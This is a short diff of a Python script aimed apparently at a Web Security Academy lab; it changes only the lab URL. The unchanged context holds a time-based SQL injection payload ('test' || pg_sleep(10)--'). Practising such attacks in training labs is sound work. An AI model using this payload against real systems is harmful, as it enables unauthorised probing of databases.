@@ -2,7 +2,7 @@
 
 import requests
 
-url = "https://aceb1f431f84c199803e2bcb005900ff.web-security-academy.net/"
+url = "https://acb11f6c1e4d99e0805f2e19009b001f.web-security-academy.net/"
 payload = "test' || pg_sleep(10)--"
 
 try:
